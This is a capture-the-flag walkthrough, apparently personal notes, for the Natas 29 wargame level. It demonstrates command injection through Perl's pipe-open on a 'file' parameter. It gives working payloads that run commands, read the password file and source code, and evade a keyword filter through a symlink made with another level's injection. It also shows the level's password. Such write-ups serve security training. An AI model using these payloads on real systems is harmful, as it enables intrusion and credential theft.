- This level deals exclusively with Perl
- We don't have any source code present with us
- Also, we observe that there are 5 options in a select dropdown on the page, which when selected, present us an e-zine related to Perl. However that's not something very much useful for us
- Going through the page's behaviour, we can observe that it is just reading out the text from some file for the zines, and if we can control the file to be included, we can also read the password file
- After doing a bit of googling and going through other hints about the level, I realised that passing a `|` character makes perl open a pipe to another process, and that can help us out
- For testing this, I passed the following payload as the `file` query param:
```
|id%00
```
- This gave the following output at the end of the page:
```
uid=30029(natas29) gid=30029(natas29) groups=30029(natas29)
```
- This means we have successfully got a way to execute arbitrary commands on the server. Now we can try reading the password file as well. So I sent the following payload:
```
|cat /etc/natas_webpass/natas30%00
```
- However, this didn't work, as I got the following output:
```
meeeeeep!
```
- This means, the input is being filtered before passing on to the perl's `open` method. Let's have a look at the source code for this using the following payload:
```
|cat index.pl%00
```
- This reveals the source code, and there we can see the following if block:
```perl
if(param('file')){
    $f=param('file');
    if($f=~/natas/){
        print "meeeeeep!<br>";
    }
```
- This means if our payload contains the keyword `natas` it will not work. So let's follow the method of using an RCE which we followed in [[Natas25_to_Natas26|solving natas25]] (more specifically, approach Bubby of that level)
- We create a symbolic link of the `natas30` password file using the RCE of `natas9`, by passing the payload as follows:
```
;ln -sf /etc/natas_webpass/natas30 /tmp/donttouchthis;
```
- This creates a temporary shortcut to `natas30` password file, which we can then include in our perl payload, like this:
```
|cat /tmp/donttouchthis%00
```
- Sending this payload reveals the password at the bottom of the page: WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH